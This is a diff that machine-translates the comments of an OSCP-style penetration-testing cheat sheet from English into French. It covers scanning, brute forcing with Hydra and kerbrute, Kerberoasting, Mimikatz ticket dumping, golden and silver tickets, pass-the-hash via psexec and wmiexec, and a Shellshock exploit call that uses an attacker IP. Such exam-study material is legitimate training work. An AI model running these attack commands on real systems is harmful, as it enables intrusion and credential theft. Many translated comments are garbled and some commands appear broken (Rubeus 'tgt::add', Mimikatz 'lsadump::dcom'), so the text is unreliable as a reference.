@@ -52,12 +52,12 @@ for ip in $(cat list.txt); do host <ip>.[domain]; done
 ```
 
 
-## Scan de ports
+## Scanner les ports
 
 Vérifier les ports et les services de la cible autorisée.
 
 
-### Netcat
+### Montant net
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -76,10 +76,10 @@ nc -l [host] [port number]
 # Rester en écoute après la première connexion
 nc -k -l [host] [port number]
 
-# TCP Scan in port range
+# TCP Balayage dans la plage de port
 nc -nvv -w 1 -z [host] [beginning_port]-[finished_port]
 
-# -w is to specify the connection timeout in seconds, as well as -z to specify zero-I/O mode, which is used for scanning and sends no data
+# -w est de spécifier le délai de connexion en secondes, ainsi que -z pour spécifier le mode zéro-I/O, qui est utilisé pour la numérisation et n'envoie aucune donnée
 nc -nv -u -z -w 1 [host] [beginning_port]-[finished_port]
 
 # -u inidcates to do an UDP scan
@@ -210,7 +210,7 @@ sudo nmap -sS [IP]
 ```
 
 
-**Specific Port Scan**
+**Scannage de port spécifique**
 
 
 
@@ -291,7 +291,7 @@ nmap -sV [IP]
 ```
 
 
-**Service Banners & Traceroute**
+**Bannières de service & Traceroute**
 
 
 <p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
@@ -314,7 +314,7 @@ Observer les permissions et la configuration de Windows.
 `-oG` (sortie grepable)  
 
 
-**Save to File ( -oG )**
+**Enregistrer dans le fichier ( -oG )**
 
 
 <p class="oscp-command-note">Identifier les hôtes actifs.</p>
@@ -361,7 +361,7 @@ nmap --script [scriptName] [IP]
 ```
 
 
-**Script Help**
+**Aide Script**
 
 
 <p class="oscp-command-note">Afficher l&#x27;aide d&#x27;un script Nmap NSE.</p>
@@ -371,7 +371,7 @@ nmap --script-help [scriptName]
 ```
 
 
-**Example Script**
+**Exemple de script**
 
 
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
@@ -402,7 +402,7 @@ nmap --script [category] [IP]
 Observer les permissions et la configuration de Windows.
 
 
-**Check TCP Port**
+**Vérifiez le port TCP**
 
 
 <p class="oscp-command-note">Tester une connexion réseau avec PowerShell.</p>
@@ -412,7 +412,7 @@ Test-NetConnection -Port [portNumber] [IP]
 ```
 
 
-**Port Scan Script**
+**Scénario de balayage de port**
 
 
 
@@ -467,7 +467,7 @@ rustscan -a <target-ip> -b 500 -u 5000
 ```
 
 
-**Scan Specific Ports Only**
+**Scanner des ports spécifiques seulement**
 
 
 
@@ -477,7 +477,7 @@ rustscan -a <target-ip> -p 22,80,443
 ```
 
 
-**Save Results to File**
+**Enregistrer les résultats dans le fichier**
 
 
 
@@ -497,7 +497,7 @@ rustscan -a <target-ip> -- -sU -p 1-65535
 ```
 
 
-**Vulnerability Detection**
+**Détection de vulnérabilité**
 
 
 
@@ -570,10 +570,10 @@ nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-ba
 ftp -A [IP]
 ftp [IP]
 
-# Login with anonymous credentials
+# Connexion avec des identifiants anonymes
 anonymous:anonymous
 
-# Upload a test file to check for reflection on an HTTP port
+# Télécharger un fichier de test pour vérifier la réflexion sur un port HTTP
 put test.txt
 ```
 
@@ -590,10 +590,10 @@ ftp> put [binary_file]
 ```bash
 wget -r ftp://[user]:[password]@[IP]/
 
-# Searching for specific file
+# Recherche de fichiers spécifiques
 find / -name [filename_pattern] 2>/dev/null
 
-# Example of searching for files
+# Exemple de recherche de fichiers
 find / -name Settings.*  2>/dev/null
 ```
 
@@ -686,10 +686,10 @@ find /home/<user>/.ssh -name "id_*"
 <p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>
 
 ```bash
-# No Password
+# Sans mot de passe
 ssh2john <private_key_file> > <private_key_file>.hash # id_rsa has no password!
 
-# Wrong User or Key
+# Utilisateur ou clé incorrects
 ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).
 ```
 
@@ -705,54 +705,54 @@ scp user@192.168.1.10:/etc/config.txt /home/user/config.txt
 scp user@remote_host:/path/to/remote/file1 /path/to/remote/file2 /local/destination/
 scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/
 
-# Download a Directory Recursively
+# Télécharger un répertoire Récursivement
 scp -r user@remote_host:/path/to/remote/directory /local/destination/
 scp -r user@192.168.1.10:/var/www/html /home/user/
 
-# Downlaod a File from a Specific Port (in case SSH is running on a non-default port)
+# Downlaod a File from a Specific Port (dans le cas où SSH fonctionne sur un port non par défaut)
 scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
 scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/
 
-# Download a File Using a Private Key
+# Télécharger un fichier utilisant une clé privée
 scp -i /path/to/private_key user@remote_host:/path/to/remote/file /local/destination/
 scp -i ~/.ssh/id_rsa user@192.168.1.10:/etc/config.txt /home/user/
 
-# Download Files with Verbose Output
+# Télécharger les fichiers avec Verbose Output
 scp -v user@remote_host:/path/to/remote/file /local/destination/
 scp -v user@192.168.1.10:/etc/config.txt /home/user/
 
-# Download File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
+# Télécharger le fichier sans clé d'hôte Vérification, pour contourner la clé d'hôte vérification (pas recommandé pour des environnements sécurisés)
 scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
 scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/
 ```
 
 
 ```bash
-# Upload a Single File
+# Télécharger un fichier unique
 scp /path/to/local/file user@remote_host:/path/to/remote/destination
 scp /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
-# Upload Multiple Files
+# Télécharger plusieurs fichiers
 scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
 scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/
 
-# Upload a Directory Recursively
+# Télécharger un répertoire
 scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
 scp -r /home/user/html user@192.168.1.10:/var/www/
 
-# Upload a File to a Specific Port (in case SSH is running on a non-default port)
+# Télécharger un fichier vers un port spécifique (dans le cas où SSH fonctionne sur un port non par défaut)
 scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
-# Upload a File Using a Private Key
+# Télécharger un fichier en utilisant une clé privée
 scp -i /path/to/private_key /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
-# Upload Files with Verbose Output
+# Télécharger des fichiers avec Verbose Output
 scp -v /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
-# Upload File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
+# Télécharger le fichier sans vérification de clé d'hôte, pour contourner la vérification de clé d'hôte (pas recommandé pour des environnements sécurisés)
 scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt
 ```
@@ -849,7 +849,7 @@ ssh -i <private_key_file> <user>@<target_ip>
 <p class="oscp-command-note">Tester la connexion à un port TCP.</p>
 
 ```bash
-# Basic login
+# Connexion de base
 telnet <target_ip> 23
 
 # Login with specific username
@@ -863,10 +863,10 @@ telnet -l <username> <target_ip>
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
 
 ```bash
-# Nmap Scripting Scan
+# Numérisation de scripts Nmap
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target_ip>
 
-# Netcat and Telnet Interaction
+# Interaction entre Netcat et Telnet
 nc -nv <target_ip> 25
 telnet <target_ip> 25
 EHLO ALL
@@ -908,14 +908,14 @@ if len(sys.argv) != 3:
     print("Usage: vrfy.py <username> <target_ip>")
     sys.exit(0)
 
-# Create a Socket
+# Créer une socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Connect to the Server
+# Se connecter au serveur
 ip = sys.argv[2]
 connect = s.connect((ip,25))
 
-# Receive the banner
+# Recevoir la bannière
 banner = s.recv(1024)
 print(banner)
 
@@ -925,7 +925,7 @@ s.send(b'VRFY ' + user + b'\r\n')
 result = s.recv(1024)
 print(result)
 
-# Close the socket
+# Fermer la socket
 s.close()
 ```
 
@@ -948,13 +948,13 @@ VRFY root
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
 
 ```bash
-# Check if vulnerable
+# Vérifier si elle est vulnérable
 nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
                 
 # Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
 python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>
 
-# Example: python2 shellshock.py 192.168.1.100 emmanuel@domain.local 192.168.1.50 139 admin@domain.local
+# Exemple : python2 shellshock.py 192.168.1.100 emmanuel@domaine.local 192.168.1.50 139 admin@domaine.local
 ```
 
 
@@ -1030,7 +1030,7 @@ nmap -p 69 --script tftp-enum <target_ip>
 
 
 ```bash
-# Usage: run the TFTP enumeration script to get a specific file
+# Utilisation : exécutez le script de dénombrement TFTP pour obtenir un fichier spécifique
 ./tftp_enum.sh <target_ip> <filename>
 ./tftp_enum.sh 192.168.1.10 bootfile.bin
 ```
@@ -1050,11 +1050,11 @@ fi
 TARGET_IP=$1
 FILENAME=$2
 
-# Attempt to retrieve file from TFTP server
+# Tenter de récupérer le fichier du serveur TFTP
 echo "Attempting to retrieve $FILENAME from $TARGET_IP"
 tftp $TARGET_IP -c get $FILENAME
 
-# Check if file was retrieved
+# Vérifiez si le fichier a été récupéré
 if [ -f $FILENAME ]; then
     echo "File $FILENAME successfully retrieved from $TARGET_IP"
 else
@@ -1102,13 +1102,13 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
 
 ```bash
-# Check for Kerberos service availability and get basic information
+# Vérifiez la disponibilité du service Kerberos et obtenez des informations de base
 nmap -p 88 --script kerberos-enum-users <target_ip>
 
-# Check for common Kerberos vulnerabilities
+# Vérifier les vulnérabilités communes de Kerberos
 nmap -p 88 --script kerberos-brute <target_ip>
 
-# Enumerate SPNs (Service Principal Names)
+# Énumérer les NSP (Noms principaux des services)
 nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
 ```
 
@@ -1159,10 +1159,10 @@ python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<t
 <p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>
 
 ```bash
-# Extract all service tickets for offline cracking
+# Extraire tous les tickets de service pour fissuration hors ligne
 impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
 
-# Crack the extracted tickets with John the Ripper or Hashcat
+# Crack les billets extraits avec John l'Éventreur ou Hashcat
 john --wordlist=<wordlist> <tickets_file>
 # or
 hashcat -m 13100 <tickets_file> <wordlist>
@@ -1192,7 +1192,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
-# Dump Kerberos tickets from memory using Mimikatz
+# Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
 mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```
 
@@ -1200,7 +1200,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
-# Test for weak pre-authentication configurations
+# Essai de configurations de pré-authentification faibles
 python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 ```
 
@@ -1208,7 +1208,7 @@ python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Create a silver ticket with Rubeus
+# Créer un ticket argent avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
 ```
 
@@ -1227,7 +1227,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Create a golden ticket with Rubeus
+# Créer un billet doré avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
 ```
 
@@ -1262,17 +1262,17 @@ nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 <target_ip>
 <p class="oscp-command-note">Tester la connexion à un port TCP.</p>
 
 ```bash
-# Connect to the POP3 service
+# Connectez-vous au service POP3
 telnet <target_ip> 110
 
-# Log in with a test user
+# Connectez-vous avec un utilisateur de test
 USER <username>
 PASS <password>
 
-# List all messages
+# Liste de tous les messages
 LIST
 
-# Retrieve the first email
+# Récupérer le premier courriel
 RETR 1
 ```
 
@@ -1283,7 +1283,7 @@ RETR 1
 # Standard brute force on POP3
 hydra -l <username> -P <password_list> -f <target_ip> pop3 -V
 
-# Brute force with SSL/TLS on POP3 over port 995
+# Force brute avec SSL/TLS sur POP3 au-dessus du port 995
 hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V
 ```
 
@@ -1291,20 +1291,20 @@ hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V
 <p class="oscp-command-note">Tester la connexion à un port TCP.</p>
 
 ```bash
-# Connect to the POP3 service
+# Connectez-vous au service POP3
 telnet <target_ip> 110
 
-# Log in with your credentials
+# Connectez-vous avec vos identifiants
 USER <username>
 PASS <password>
 
-# List all messages
+# Liste de tous les messages
 LIST
 
-# Retrieve a specific email by its number
+# Récupérer un email spécifique par son numéro
 RETR <mail_number>
 
-# Close the connection
+# Fermer la connexion
 QUIT
 ```
 
@@ -1322,7 +1322,7 @@ nmap -sV -p 111 --script=rpcinfo <target_ip>
 
 
 ```bash
-# Use rpcinfo to get a list of registered RPC services on the target
+# Utilisez rpcinfo pour obtenir une liste des services RPC enregistrés sur la cible
 rpcinfo -p <target_ip>
 ```
 
@@ -1330,7 +1330,7 @@ rpcinfo -p <target_ip>
 <p class="oscp-command-note">Lister les exports NFS.</p>
 
 ```bash
-# Check available RPC services and their versions with showmount
+# Vérifiez les services RPC disponibles et leurs versions avec showmount
 showmount -e <target_ip>
 ```
 
@@ -1359,7 +1359,7 @@ rpcdump.py <target_ip> -p 135
 
 
 ```bash
-# Scan for RPC over HTTP services using Nmap
+# Scanner les services RPC sur les services HTTP en utilisant Nmap
 nmap -p 593 --script http-rpc-epmap <target_ip>
 ```
 
@@ -1371,19 +1371,19 @@ nmap -p 593 --script http-rpc-epmap <target_ip>
 <p class="oscp-command-note">Examiner les objets exposés par RPC.</p>
 
 ```bash
-# Connect with a null session
+# Connexion avec une session null
 rpcclient -U "" -N <target_ip>
 
-# Connect to the target and list available shares
+# Se connecter à la cible et lister les actions disponibles
 rpcclient -U "" -N <target_ip> -c "srvinfo"
 
-# List all available users
+# Liste de tous les utilisateurs disponibles
 rpcclient -U "" -N <target_ip> -c "enumdomusers"
 
-# Enumerate domain groups
+# Énumérer les groupes de domaines
 rpcclient -U "" -N <target_ip> -c "enumdomgroups"
 
-# Query user information
+# Demande d'informations à l'utilisateur
 rpcclient -U "<username>" -W "<domain>" <target_ip> -c "queryuser <username>"
 ```
 
@@ -1412,19 +1412,19 @@ dsenumdomtrusts
 
 
 ```bash
-# List Users
+# Liste des utilisateurs
 enumdomusers
 
-# Get User Details
+# Obtenir les détails de l'utilisateur
 queryuser <0xrid>
 
-# Get User Groups
+# Obtenir des groupes d'utilisateurs
 queryusergroups <0xrid>
 
-# Get User SID
+# Obtenir l'utilisateur SID
 lookupnames <username>
 
-# Get User Aliases
+# Obtenez des Aliases Utilisateurs
 queryuseraliases [builtin|domain] <sid>
 ```
 
@@ -1432,13 +1432,13 @@ queryuseraliases [builtin|domain] <sid>
 <p class="oscp-command-note">Script shell dans la rubrique « 135, 593: MSRPC ».</p>
 
 ```bash
-# List Groups
+# Liste des groupes
 enumdomgroups
 
-# Get Group Details
+# Obtenir les détails du groupe
 querygroup <0xrid>
 
-# Get Group Members
+# Obtenir des membres du groupe
 querygroupmem <0xrid>
 ```
 
@@ -1446,10 +1446,10 @@ querygroupmem <0xrid>
 
 
 ```bash
-# List Aliases
+# Liste des alias
 enumalsgroups <builtin|domain>
 
-# Get Members of Alias
+# Obtenez des membres d'Alias
 queryaliasmem builtin|domain <0xrid>
 ```
 
@@ -1457,13 +1457,13 @@ queryaliasmem builtin|domain <0xrid>
 
 
 ```bash
-# List Domains
+# Liste des domaines
 enumdomains
 
 # Obtain Domain SID
 lsaquery
 
-# Get Domain Information
+# Obtenir des informations de domaine
 querydominfo
 ```
 
@@ -1479,7 +1479,7 @@ crackmapexec smb <IP> -u 'admin' -p wordlist_pass.txt
 # Autre possibilité
 crackmapexec smb <IP> -u 'wordlist_user.txt' -p password
 
-# Lookup SID with Brute Force (requires that we have valid credentials and the domain name)
+# Lookup SID avec Brute Force (exige que nous ayons des identifiants valides et le nom de domaine)
 impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
 ```
 
@@ -1490,10 +1490,10 @@ impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
 Find SID by Name
 lookupnames <username>
 
-# Find More SIDs
+# Trouver d'autres SID
 lsaenumsid
 
-# Check RID Cycle for More SIDs
+# Vérifiez le cycle RID pour plus de SID
 lookupsids <sid>
 ```
 
@@ -1530,7 +1530,7 @@ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-d
 # NetBIOS Scan
 sudo nbtscan -r 192.168.50.0/24
 
-# Windows Network View
+# Vue réseau Windows
 net view \\[domainName] /all
 ```
 
@@ -1555,10 +1555,10 @@ nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-
 <p class="oscp-command-note">Script shell dans la rubrique « 139, 445: SMB ».</p>
 
 ```bash
-# Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
+# Analyse des paquets réseau: capture et analyse les paquets liés au trafic SMB sur le port 139, à la recherche de modèles spécifiques
 sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 
-# Lists available SMB shares on the target
+# Listes des actions SMB disponibles sur la cible
 smbclient -L <IP>
 ```
 
@@ -1592,14 +1592,14 @@ crackmapexec smb <IP> -u '[user]' -p '[password]'
 <p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>
 
 ```bash
-# Basic information gathering on the domain
+# Collecte d'informations de base sur le domaine
 enum4linux -a <IP>
 enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>
 
-# Extract domain users
+# Extraire les utilisateurs du domaine
 enum4linux -U <DOMAIN_IP>
 
-# Extract available domain shares
+# Extraire les parts de domaine disponibles
 enum4linux -S <IP>
 
 enum4linux -a -M -l -d <ip> 2>&1
@@ -1616,11 +1616,11 @@ smbclient //<IP>/<SHARE>
 smbclient -N //<IP>/<SHARE>
 smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files
 
-# Change the timeout to download big files
+# Changer le timeout pour télécharger les gros fichiers
 help timeout
 timeout 100
 
-# Other commands
+# Autres commandes
 prompt off
 recurse on
 mget *
@@ -1638,7 +1638,7 @@ hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 <p class="oscp-command-note">Créer un répertoire.</p>
 
 ```bash
-# Mounts SMB shares to a local directory for further access and manipulation.
+# Monte les parts de SMB dans un répertoire local pour plus d'accès et de manipulation.
 mkdir /tmp/share
 sudo mount -t cifs //<IP>/<SHARE> /tmp/share
 sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
@@ -1667,13 +1667,13 @@ atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
 
 ```bash
-# Credentials
+# Identifiants
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 
-# Pass the Hash
+# Pass-the-Hash
 psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
-# Testing with Crackmapexec
+# Vérification avec CrackMapExec
 crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
 crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 ```
@@ -1682,13 +1682,13 @@ crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 <p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
 
 ```bash
-# Credentials
+# Identifiants
 wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 
-# Pass the Hash
+# Pass-the-Hash
 wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
-# Testing with Crackmapexec
+# Vérification avec CrackMapExec
 crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
 crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
 ```
@@ -1851,29 +1851,29 @@ nmap -n -sV --script "ldap* and not brute" <target_ip>
 <p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
-# Basic LDAP query
+# Demande LDAP de base
 ldapsearch -x -H ldap://<target_ip>
 
-# Basic LDAP Search for a base-level
+# LDAP de base Rechercher un niveau de base
 ldapsearch -h <target_ip> -x -s base
 
 # Afficher les contextes de nommage LDAP
 ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
 
-# Search in a Specific Base Domain Name
+# Rechercher dans un nom de domaine de base spécifique
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
 
-# Enumerate users using LDAP
+# Énumérer les utilisateurs utilisant LDAP
 ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"
 
-# Retrieve users Account Name
+# Récupérer le nom de compte des utilisateurs
 ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:
 
-# Search with Filters
+# Rechercher avec les filtres
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"
 
-# Searching with authentication
+# Recherche avec authentification
 ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
 
 # Searching terms
@@ -1894,99 +1894,99 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 <p class="oscp-command-note">Script shell dans la rubrique « 389, 636, 3268 &amp; 3269: LDAP ».</p>
 
 ```bash
-# Search Terms to Find Cleartext Passwords
-# Search for ms-MCS-AdmPwd (local administrator passwords)
+# Termes de recherche pour trouver les mots de passe Cleartext
+# Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
 (ms-MCS-AdmPwd=*)
 
-# Search for attributes containing 'password' in description
+# Rechercher les attributs contenant 'password' dans la description
 (description=*password*)
 
-# Search for LAPS expiration time (to identify potential password management)
+# Rechercher le délai d'expiration de LAPS (pour identifier la gestion de mot de passe potentielle)
 (ms-MCS-AdmPwdExpirationTime=*)
 
-# Search for common weak passwords in attributes like description
+# Rechercher des mots de passe faibles communs dans des attributs comme la description
 (description=*(123456*|password*|qwerty*|letmein*))
 
-# General LDAP Search Filters
-# Search for All Users
+# Général LDAP Filtres de recherche
+# Rechercher tous les utilisateurs
 (objectClass=user)
 
-# Search for All Computers
+# Rechercher tous les ordinateurs
 (objectClass=computer)
 
-# Search for All Groups
+# Rechercher tous les groupes
 (objectClass=group)
 
-# Search for Disabled Accounts
+# Recherche de comptes handicapés
 (userAccountControl:1.2.840.113556.1.4.803:=2)
 
-# Search for Expired Accounts
+# Recherche de comptes expirés
 (& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))
 
-# Search for Specific Group Membership
+# Rechercher un abonnement de groupe spécifique
 (&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))
 
-# Search for Users with Specific Attributes
-# For users with a specific email domain
+# Rechercher des utilisateurs avec des attributs spécifiques
+# Pour les utilisateurs ayant un domaine de messagerie spécifique
 (mail=*@example.com)
-# For users with a specific title
+# Pour les utilisateurs ayant un titre spécifique
 (title=Manager)
 
 # Specific Attributes
 
-# Search for Password Last Set
+# Recherche du dernier jeu de mots de passe
 (pwdLastSet=*)
 
-# Search for Accounts with Expired Passwords
+# Recherche de comptes avec mot de passe expiré
 (& (objectClass=user)(pwdLastSet<=0))
 
-# Search for Accounts in a Specific Organizational Unit (OU)
+# Recherche de comptes dans une unité organisationnelle spécifique (OU)
 (distinguishedName=*,OU=Sales,DC=domain,DC=com)
 
 # Security-Related Searches
 
-# Search for Accounts with Kerberos Pre-Authentication Disabled
+# Recherche de comptes avec Kerberos pré-authentification désactivée
 (userAccountControl:1.2.840.113556.1.4.803:=4194304)
 
-# Search for Service Principal Names (SPNs)
+# Recherche de noms principaux de services (SPN)
 (servicePrincipalName=*)
 
-# Search for Delegated Users
+# Recherche d'utilisateurs délégués
 (msDS-AllowedToDelegateTo=*)
 
-# Search for Accounts with Privileges
+# Rechercher des comptes avec des privilèges
 (memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)
 
 # Other Useful Searches
 
-# Search for All Organizational Units
+# Rechercher toutes les unités organisationnelles
 (objectClass=organizationalUnit)
 
-# Search for Active Directory Certificate Services
+# Recherche de services de certificat d'annuaire actif
 (objectClass=cACertificate)
 
-# Search for All Attributes of a Specific User
+# Rechercher tous les attributs d'un utilisateur spécifique
 (sAMAccountName=username)
 
-# Search for Accounts with Specific Notes or Descriptions
+# Recherche de comptes avec notes ou descriptions spécifiques
 (description=*keyword*)
 
-# Search for all objects in the directory
+# Rechercher tous les objets dans le répertoire
 (objectClass=*)
 
-# Search for service accounts
+# Recherche de comptes de service
 (objectCategory=serviceAccount)
 
-# Search for accounts with specific group memberships (replace 'GroupName')
+# Recherche de comptes avec des abonnements spécifiques de groupe (remplacer 'GroupName')
 (memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)
 
-# Search for computer accounts
+# Recherche de comptes informatiques
 (objectClass=computer)
 
-# Search for users in a specific organizational unit (replace 'OU=Users')
+# Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
 (ou=OU=Users,DC=domain,DC=com)
 
-# Search for all accounts with specific attributes
+# Rechercher tous les comptes avec des attributs spécifiques
 (pwdLastSet=0)
 ```
 
@@ -2001,7 +2001,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ```bash
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>
 
-# Enumerate MSSQL database information and configurations
+# Énumérer les informations et les configurations de la base de données MSSQL
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 <target_ip>
 ```
 
@@ -2009,10 +2009,10 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Check MSSQL service and execute command
+# Vérifiez le service MSSQL et exécutez la commande
 crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_ip>
 
-# Query databases and list them
+# Interroger les bases de données et les énumérer
 crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM master.dbo.sysdatabases;" <target_ip>
 ```
 
@@ -2020,10 +2020,10 @@ crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM 
 <p class="oscp-command-note">Script shell dans la rubrique « 1433: MSSQL ».</p>
 
 ```bash
-# Connect to MSSQL using sqsh (Linux)
+# Connectez-vous à MSSQL en utilisant sqsh (Linux)
 sqsh -S <target_ip> -U <username> -P <password>
 
-# Connect to MSSQL using sqsh (Windows)
+# Connectez-vous à MSSQL en utilisant sqsh (Windows)
 sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
 ```
 
@@ -2096,10 +2096,10 @@ nmap -p 2049 -sV --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client
 <p class="oscp-command-note">Lister les exports NFS.</p>
 
 ```bash
-# Show all NFS shares on the target
+# Afficher toutes les parts de NFS sur la cible
 showmount -e <target_ip>
 
-# Show mount information for the target
+# Afficher les informations de montage pour la cible
 showmount <target_ip>
 ```
 
@@ -2107,10 +2107,10 @@ showmount <target_ip>
 <p class="oscp-command-note">Créer un répertoire.</p>
 
 ```bash
-# Create a local directory to mount the NFS share
+# Créer un répertoire local pour monter le partage NFS
 mkdir <mount_point>
 
-# Mount the NFS share
+# Monter la part NFS
 sudo mount -t nfs -o vers=<version>,nolock <target_ip>:<share> <mount_point>
 ```
 
